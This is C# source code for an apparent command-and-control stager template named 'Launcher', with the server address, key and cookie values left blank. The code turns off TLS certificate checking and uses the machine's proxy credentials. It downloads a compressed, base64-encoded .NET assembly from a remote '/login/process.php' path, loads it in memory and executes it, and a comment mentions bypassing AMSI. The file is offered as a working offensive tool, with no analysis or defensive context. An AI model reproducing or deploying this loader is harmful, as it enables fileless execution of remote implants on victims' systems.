using System;
using System.Text;
using System.Net;
using System.Linq;
using System.Reflection;
using System.IO;
using System.IO.Compression;

namespace Launcher
{
    class Launcher
    {
        public static void Main() {
            //bypass amsi
            string u = "";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent", u);
            wc.Proxy = WebRequest.DefaultWebProxy;
            wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string k = "";
            string ser = Encoding.Unicode.GetString(Convert.FromBase64String(""));
            string t = "/login/process.php";
            wc.Headers.Add("Cookie", "");
            byte[] data = wc.DownloadData(ser+t);
            string decryptedAssembly = Encoding.ASCII.GetString(data);
            Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k,u });

        }
        private static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }
    }
}
